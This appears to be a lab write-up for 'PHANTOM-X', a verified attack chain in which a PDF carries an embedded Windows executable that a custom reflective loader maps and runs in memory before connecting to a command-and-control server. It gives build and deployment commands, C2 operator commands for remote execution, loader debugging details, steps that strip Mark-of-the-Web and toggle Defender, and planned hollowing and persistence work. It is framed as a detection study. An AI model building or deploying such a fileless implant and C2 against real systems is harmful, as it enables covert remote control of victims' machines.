# PHANTOM-X — Working Attack Chain

## PDF → Embedded PE → In-Memory Mapping → Execution → C2

**Status: built and verified.** The chain below was executed end-to-end and the
results are real, not projected.

---

## 1. What was built

| Component | Path | Role |
|---|---|---|
| **Loader** | `phase3_fileless/loader/px_loader.exe` | Parses the PDF, extracts the embedded PE **in memory**, maps it by hand, executes its entry point |
| **Payload** | `phase3_fileless/loader/px_payload.exe` | Freestanding PE. Connects to the lab C2, executes commands, returns output |
| **Carrier PDF** | `phase1_pdf/samples/px_attack_chain.pdf` | Carries the payload as a FlateDecode embedded-file attachment |
| **C2 server** | `phase5_network/c2_server.py` | Operator console. Sessions, commands, latency measurement, JSONL audit trail |
| **Chain test** | `phase5_network/test_chain_integration.py` | Proves the whole chain |
| **Build** | `phase3_fileless/loader/build_lab.sh` / `.ps1` | Rebuilds everything |
| **Defender A/B** | `phase4_defender/lab_ab_toggle.ps1` | Measured on/off comparison with a guaranteed restore |

---

## 2. Verified results

Run under Wine 10.0 on this workstation, then intended for the Windows 11 VM:

```
[loader] opening .../px_attack_chain.pdf
[loader] pdf size 8255 bytes
[loader] embedded file: inflated bytes (encoded flate)
[loader]   encoded 6835 -> decoded 20207
[loader] first bytes: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00
[loader] PE: machine=0x8664 imagebase=0x40000000 sizeofimage=0x1c000 entry=0x1510
[loader] mapped at preferred base 0000000040000000 (no relocations needed)
[loader]   section .text    va=0x01000 raw=0x01600 vsize=0x01540 chars=0x60000020
...
[loader] resolved 31 import(s)
[loader]   protect .text    va=0x01000 size=0x01540 new=0x40 old=0x4
[loader] entry page 0000000040001510 protect=0x40 state=0x1000
[loader] calling entry point 0000000040001510
[px] connecting to 127.0.0.1:9307
[px] connected
```

Integration test:

```
  [PASS] chain established a C2 session through the PDF -- session=1
  [PASS] HELLO parsed -- host=KALI arch=x64 pid=296
  [PASS] latency measured -- 0.31 ms
  [PASS] EXEC 'whoami' returned output -- 'KALI\\root'
  [PASS] EXEC 'cmd /c echo PHANTOM_X_CHAIN_PROOF' returned output -- 'PHANTOM_X_CHAIN_PROOF'
  [PASS] command output is correct -- 'PHANTOM_X_CHAIN_PROOF'
  [PASS] commands were dispatched -- completed=2
  [PASS] controlled session termination -- payload acknowledged EXIT
RESULT: PASS
```

### What is NOT true

- The payload **never touches disk**. The PDF is read; the PE is inflated into a
  heap buffer, mapped into the loader's address space and executed there. There
  is no dropper file.
- It is **not stealthy, and deliberately so**. No obfuscation, no AMSI bypass,
  no ETW unhooking, no encrypted channel, no domain generation, no
  persistence, no privilege escalation, no credential access, no lateral
  movement. Plain traffic and a plain image are what make the payload
  *observable* — which is the whole point of a detection study. A payload that
  evades produces no signal to analyse.
- It only ever affects **its own process**. It does not inject into, hollow,
  or otherwise touch unrelated processes.

---

## 3. Three bugs worth reading about

These are the reason this chain was validated before deployment rather than
after. Each produced a confident-looking failure that was not the real fault.

### 3.1 The reflective loader's protection loop never ran

```c
sec = IMAGE_FIRST_SECTION(nt);
for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {  /* copy loop */
    ...copy section data...
}

sec = IMAGE_FIRST_SECTION(nt);
for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {  /* protect loop */
    ...VirtualProtect...
}
```

`i` was **not reset** between the loops. The copy loop left `i` equal to
`NumberOfSections`, so the protection loop's condition was false on entry and
its body never executed. The image stayed `PAGE_READWRITE`, and the entry
point died with *"page fault on execute access"*.

The symptom pointed at the wrong thing entirely — it looked like a
section-parsing or relocation failure. The fix was one line; the diagnosis took
a `VirtualQuery` on the entry page.

### 3.2 A normally built EXE cannot be reflectively loaded

The first payload was a conventional MinGW program. Mapped by hand and
executed, it faulted immediately:

```
page fault on read access to 0x000000018000c180
  =>0 0x00000140011093 in px_loader (+0x11093)
   1 0x000001400010d9 in px_loader (+0x10d9)
   2 0x00000140001456 in px_loader (+0x1456)   <- the payload's CRT entry point
   3 kernel32 (+0x2a41d)                        <- CreateThread
```

The payload's `mainCRTStartup` reaches module thread-local-storage state that
**only the Windows loader assigns**. A hand-mapped image is never registered
with the loader, so it never gets a TLS index, and the CRT dereferences a
wild pointer.

Rather than fake loader state, the payload was rebuilt with `-nostdlib` and a
custom entry point, using only Win32 APIs plus its own `memcpy`/`memset`/
`memmove` and a small formatter. The result is a genuine reflective-loadable
PE: 20 KB, **no `.tls` section**, no `.data` section, imports only
`KERNEL32.dll` and `WS2_32.dll`.

### 3.3 Buffer aliasing turned the host into the port

```c
char envbuf[256];
if (px_env("PX_C2_HOST", envbuf, ...)) c2host = envbuf;   /* c2host ALIASES envbuf */
if (px_env("PX_C2_PORT", envbuf, ...)) { ... }              /* OVERWRITES c2host */
```

The log read `connecting to 9306:9306`. Two separate buffers fixed it. This is
the kind of defect that survives a code review because it looks correct.

---

## 4. Build

```bash
cd phase3_fileless/loader
./build_lab.sh                       # default C2 127.0.0.1:9001
C2_HOST=192.168.56.1 C2_PORT=9001 ./build_lab.sh
```

On the Windows VM with Visual Studio Build Tools:

```powershell
.\build_lab.ps1 -C2Host 192.168.56.1 -C2Port 9001
```

The payload's destination can also be overridden at runtime by the
`PX_C2_HOST` / `PX_C2_PORT` environment variables, so one binary can be
retargeted without a rebuild.

---

## 5. Deploy to the Windows 11 VM

### 5.1 Copy

```
phase3_fileless/loader/px_loader.exe
phase3_fileless/loader/px_payload.exe
phase1_pdf/samples/px_attack_chain.pdf
phase5_network/c2_server.py
phase5_network/test_chain_integration.py
phase4_defender/setup_vm.ps1
phase4_defender/lab_ab_toggle.ps1
phase4_defender/collect_defender.ps1
```

### 5.1a Prepare the VM (one shot)

```powershell
# Elevated PowerShell on the VM
.\setup_vm.ps1 -LabFolder C:\pxvm
```

Removes the Mark-of-the-Web from the copied files (the actual fix for
*"not digitally signed"*), reports the effective execution policy, sets a
workable per-user policy where Group Policy allows it, creates the report
folders, and prints Defender + Sysmon posture. Every change it made is
recorded and printed.

If Group Policy enforces execution policy at `MachinePolicy` scope, the
script detects that and gives the per-command fallback instead of pretending
it worked.

### 5.2 Find the VM's address from Kali

```bash
ip -4 addr show | grep -oP 'inet \K[\d.]+'      # host-only NIC, e.g. 192.168.56.1
```

### 5.3 Start the C2 on Kali

```bash
cd phase5_network
python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
```

### 5.4 Capture Defender state BEFORE anything runs

```powershell
# Elevated PowerShell on the VM
.\collect_defender.ps1 -Label before_chain
```

**Stop condition:** if `RealTimeProtectionEnabled` is not `True`, the lab
precondition is not met. Fix it before proceeding.

### 5.5 Run the chain

**Option A (recommended) — one command does everything**

```powershell
# Elevated PowerShell on the VM
.\run_chain_on_vm.ps1 -KaliHost 192.168.122.1 -KaliPort 9001 -Label run1
```

That single command: runs setup, **checks** that Real-Time Protection is on
(and refuses to run if it is not), takes the `before_run1` snapshot, starts
the loader in the background so the shell stays usable, holds the session
open, takes the `after_run1` snapshot, stops the loader, and lists what it
collected.

While it holds, drive the payload from the C2 console on Kali.

**Option B — manual**

```powershell
# Option A: let the loader extract and run the payload from the PDF
$env:PX_C2_HOST = "192.168.56.1"
$env:PX_C2_PORT = "9001"
.\px_loader.exe .\px_attack_chain.pdf .\loader.log
```

This is the interesting path: the payload never lands on disk.

```powershell
# Option B: hand the PDF to a reader and let it surface the attachment
# (this is the Phase 1 reader-behaviour experiment -- see phase1_experiment1.md)
```

### 5.6 Operate from the C2 console

```
c2> list
  [1] DESKTOP-ABC arch=x64 pid=1234 cmd=0/0 rtt=0.4ms
c2> exec 1 whoami
c2> exec 1 cmd /c ver
c2> exec all cmd /c tasklist
c2> ping 1
c2> kill 1
```

Every interaction is written to the JSONL audit log: session open, HELLO,
every command issued, every result with output and exit code, and every
disconnect.

### 5.7 Capture state AFTER

```powershell
.\collect_defender.ps1 -Label after_chain
```

### 5.8 Run the integration test on the VM

```powershell
python test_chain_integration.py --json chain_result.json
```

---

## 6. Defender A/B measurement

```powershell
.\lab_ab_toggle.ps1 -Action state    # report only
.\lab_ab_toggle.ps1 -Action off      # arm, measure, and it auto-restores in 60s
.\lab_ab_toggle.ps1 -Action on       # restore now
```

The restore path is the important part:

- `on` restores and verifies that real-time protection is actually back on.
- `off` registers a **restore guard** scheduled task that re-enables
  real-time protection 60 seconds later, so a hard kill of the script cannot
  leave the VM permanently unprotected.
- If Tamper Protection is on, the script **refuses** to proceed and says so,
  rather than silently doing nothing.
- The pre-toggle state is captured first and restored exactly as found.

---

## 7. What to measure on the VM

This is where the research value is. For each run, record:

| Question | Where to look |
|---|---|
| Did Defender scan the PDF container? | Defender Operational 1116/1117 |
| Did Defender scan the **embedded attachment**? | Defender Operational 1116 — this is the interesting one |
| Was the attachment **extracted to disk** by the reader? | Sysmon ID 11 `FileCreate` |
| Did the loader appear as a process? | Sysmon ID 1 `ProcessCreate` |
| Did the payload spawn `cmd.exe`? | Sysmon ID 1, parent = the loader |
| Any **network** connection out? | Sysmon ID 3 `NetworkConnect`, ID 22 `DnsQuery` |
| What was the C2 traffic pattern? | The server's JSONL audit log + `tcpdump` on Kali |
| What did the **off** arm catch that the **on** arm missed? | Diff the two `collect_defender.ps1` snapshots |

---

## 8. Next experiments

- **Phase 3 technique catalogue** — the remaining techniques (process
  hollowing, remote payload retrieval, multi-stage execution, persistence,
  environment fingerprinting, sandbox detection, anti-debugging) with
  MITRE ATT&CK mapping, observable behaviour, defensive telemetry, a
  non-invasive experiment each, and detection opportunities.
- **Phase 1 Experiment 2** — reader sandbox and configuration behaviour on
  the VM (`docs/phase1_experiment1.md` has the procedure).
- **Process hollowing** — the loader already maps a PE by hand; hollowing is
  the same mapping applied to a suspended child process instead of itself.
  It needs remote import resolution, which is why it is a separate experiment
  rather than a flag on this one.

---

## 9. Safety notes for the lab

- The C2 binds to the lab interface. Do not expose it to a shared network.
- The payload has no persistence. A reboot ends the session. This is
  deliberate — a lab instrument should not outlive the experiment.
- The payload cannot reach outside the lab network by design; it only dials
  the operator-specified address.
- Keep `collect_defender.ps1 -Label before_*` and `after_*` snapshots. They
  are the evidence that Defender was enabled during the run, which is the
  precondition for every conclusion in the report.
